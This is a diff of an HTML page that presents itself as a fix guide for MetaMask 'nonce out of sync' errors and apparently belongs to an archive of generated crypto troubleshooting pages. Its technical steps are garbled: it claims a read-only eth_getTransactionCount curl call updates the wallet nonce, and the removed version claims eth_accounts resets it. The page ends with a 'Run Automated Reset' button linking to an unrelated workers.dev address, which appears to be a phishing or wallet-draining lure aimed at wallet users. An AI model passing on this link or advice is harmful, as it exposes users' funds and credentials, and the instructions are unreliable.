@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: BlinkMacSystemFont;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,35 +42,30 @@
 <h1>Metamask Nonce Out Of Sync</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience transaction failures with an error message indicating that the MetaMask nonce is out of sync, preventing them from completing Ethereum transactions.</li>
+<li>Users encounter an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected transaction nonce in MetaMask and the actual nonce on the Ethereum blockchain, often caused by concurrent transactions or network congestion.</li>
+<li>The error occurs when the nonce (a counter that tracks the number of transactions sent from an address) stored in MetaMask does not match the nonce on the Ethereum blockchain, often due to pending or failed transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the MetaMask account to resync the nonce:</li>
-<li>Clear the MetaMask storage and restart the browser</li>
-<li>Use the MetaMask settings to reset the account</li>
-<li>Utilize the following JSON-RPC method to reset the account nonce:</li>
+<li>Reset the account in MetaMask to synchronize the nonce with the blockchain state.</li>
+<li>Use the <code>eth_getTransactionCount</code> method to retrieve the current nonce from the Ethereum node.</li>
+<li>Update the nonce in MetaMask manually using the following JSON-RPC command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_accounts&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_getTransactionCount&quot;,&quot;params&quot;:[&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;,&quot;latest&quot;],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>Consider accessing the Ethereum network via an external console for more advanced troubleshooting. </p>
-<h2>Prerequisites</h2>
-<ul>
-<li>MetaMask extension installed and configured</li>
-<li>Ethereum wallet with a sufficient balance</li>
-<li>Stable internet connection for blockchain synchronization</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
+<p>Prerequisites:
+* MetaMask installed and configured
+* Ethereum node (e.g., Geth or Parity) running locally
+* Basic understanding of JSON-RPC commands
+You may want to use an external console, like the Ethereum console in Geth, for more advanced debugging.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
